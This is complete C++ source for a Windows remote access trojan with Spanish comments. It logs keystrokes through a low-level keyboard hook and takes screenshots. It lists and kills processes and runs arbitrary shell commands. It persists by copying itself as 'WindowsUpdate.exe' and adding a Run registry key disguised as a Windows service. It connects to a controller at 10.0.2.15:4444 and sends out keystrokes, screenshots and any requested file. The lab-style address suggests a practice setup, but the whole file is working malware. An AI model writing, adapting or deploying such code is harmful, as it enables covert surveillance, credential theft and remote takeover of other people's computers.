#include <iostream>
#include <winsock2.h>
#include <string>
#include <array>
#include <memory>
#include <windows.h>
#include <thread>
#include <fstream>  
#include <vector>   
#include <gdiplus.h> 
#include <tlhelp32.h> // Necesario para el Pack de Herramientas (Procesos)

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdiplus.lib") 
#pragma comment(lib, "gdi32.lib")    

using namespace Gdiplus; 

std::string registroTeclas = "";

// --- 1. FUNCIÓN DE RECONOCIMIENTO ---
std::string obtenerInfoSistema() {
    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcSize = sizeof(pcName);
    GetComputerNameA(pcName, &pcSize);
    char userName[256];
    DWORD userSize = sizeof(userName);
    GetUserNameA(userName, &userSize);
    return std::string(pcName) + "|" + std::string(userName);
}

// --- 2. GESTIÓN DE PROCESOS (SYSTEM TOOLS) ---
std::string listarProcesos() {
    std::string resultado = "--- PROCESOS ---\n";
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return "Error al obtener Snapshot.\n";

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Formato que el Dashboard espera: PID:Nombre|
            resultado += std::to_string(pe32.th32ProcessID) + ":" + pe32.szExeFile + "|";
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return resultado;
}

std::string matarProceso(int pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) return "ERROR: Acceso denegado o proceso inexistente.\n";

    if (TerminateProcess(hProcess, 0)) {
        CloseHandle(hProcess);
        return "SUCCESS: Proceso " + std::to_string(pid) + " terminado.\n";
    }
    CloseHandle(hProcess);
    return "ERROR: No se pudo terminar el proceso.\n";
}

// --- 3. FUNCIÓN PARA ENVIAR ARCHIVOS ---
void enviarArchivo(SOCKET sock, std::string ruta) {
    std::ifstream file(ruta, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::string err = "ERROR: No se pudo abrir el archivo.\n";
        send(sock, err.c_str(), (int)err.length(), 0);
        return;
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::string header = "FILE_SIZE:" + std::to_string(size);
    send(sock, header.c_str(), (int)header.length(), 0);
    
    Sleep(300); 

    std::vector<char> buffer(size);
    if (file.read(buffer.data(), size)) {
        send(sock, buffer.data(), (int)size, 0);
    }
    file.close();
}

// --- 4. FUNCIONES PARA CAPTURA DE PANTALLA ---
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

void capturarPantalla(SOCKET sock) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    std::string rutaImg = std::string(getenv("TEMP")) + "\\scr.jpg";

    {   
        int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
        SelectObject(hMemoryDC, hBitmap);
        BitBlt(hMemoryDC, 0, 0, w, h, hScreenDC, x, y, SRCCOPY);

        Bitmap bitmap(hBitmap, NULL);
        CLSID clsid;
        GetEncoderClsid(L"image/jpeg", &clsid);
        
        std::wstring wruta(rutaImg.begin(), rutaImg.end());
        bitmap.Save(wruta.c_str(), &clsid, NULL);

        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
    } 

    GdiplusShutdown(gdiplusToken);
    enviarArchivo(sock, rutaImg);
    DeleteFileA(rutaImg.c_str());
}

// --- 5. KEYLOGGER ---
LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        if (pKeyBoard->vkCode == VK_BACK) registroTeclas += "[BACKSPACE]";
        else if (pKeyBoard->vkCode == VK_RETURN) registroTeclas += "\n";
        else if (pKeyBoard->vkCode == VK_SPACE) registroTeclas += " ";
        else if (pKeyBoard->vkCode >= 0x30 && pKeyBoard->vkCode <= 0x5A) registroTeclas += (char)pKeyBoard->vkCode; 
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void IniciarKeylogger() {
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, HookTeclado, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hhkLowLevelKybd);
}

// --- 6. PERSISTENCIA Y RCE ---
void instalarPersistencia() {
    char rutaPropia[MAX_PATH];
    GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
    std::string rutaDestino = std::string(getenv("APPDATA")) + "\\WindowsUpdate.exe";
    CopyFileA(rutaPropia, rutaDestino.c_str(), FALSE);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), (DWORD)rutaDestino.length());
    RegCloseKey(hKey);
}

std::string ejecutarComando(const char* cmd) {
    std::array<char, 128> buffer;
    std::string resultado;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) return "Error.\n";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) resultado += buffer.data();
    return resultado;
}

// --- 7. MAIN (BUCLE DE COMANDOS ACTUALIZADO) ---
int main() {
    instalarPersistencia();
    std::thread(IniciarKeylogger).detach(); 

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serv_addr;
    char buffer[4096];

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); 

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) return -1;

    std::string identidad = obtenerInfoSistema();
    send(sock, identidad.c_str(), (int)identidad.length(), 0);

    while (true) {
        memset(buffer, 0, 4096);
        int valread = recv(sock, buffer, 4096, 0);
        if (valread <= 0) break;

        std::string comando(buffer);

        if (comando == "dump") {
            if (registroTeclas.empty()) send(sock, "Buffer vacio.\n", 14, 0);
            else { send(sock, registroTeclas.c_str(), (int)registroTeclas.length(), 0); registroTeclas = ""; }
        } 
        else if (comando == "screenshot") {
            capturarPantalla(sock);
        }
        else if (comando == "ps") {
            std::string lista = listarProcesos();
            send(sock, lista.c_str(), (int)lista.length(), 0);
        }
        else if (comando.find("kill ") == 0) {
            try {
                int pid = std::stoi(comando.substr(5));
                std::string res = matarProceso(pid);
                send(sock, res.c_str(), (int)res.length(), 0);
            } catch (...) {
                std::string err = "ERROR: PID invalido.\n";
                send(sock, err.c_str(), (int)err.length(), 0);
            }
        }
        else if (comando.find("download ") == 0) {
            enviarArchivo(sock, comando.substr(9));
        }
        else {
            std::string respuesta = ejecutarComando(comando.c_str());
            send(sock, respuesta.c_str(), (int)respuesta.length(), 0);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
